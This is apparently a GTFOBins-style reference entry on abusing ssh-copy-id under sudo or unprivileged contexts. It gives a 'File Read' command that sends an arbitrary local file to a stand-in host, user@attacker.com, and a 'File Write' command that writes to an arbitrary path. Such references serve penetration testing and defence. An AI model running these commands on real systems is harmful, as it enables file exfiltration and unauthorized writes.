title: ssh-copy-id
html:
ssh-copy-id

File Read

Context: sudo, unprivileged

ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com

File Write

Context: sudo, unprivileged

ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
excerpt: ssh-copy-id File Read Context: sudo, unprivileged ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com File Write Context: sudo, unprivileged ssh-copy-id -f -i /path/to/input-file.pub -t /path/
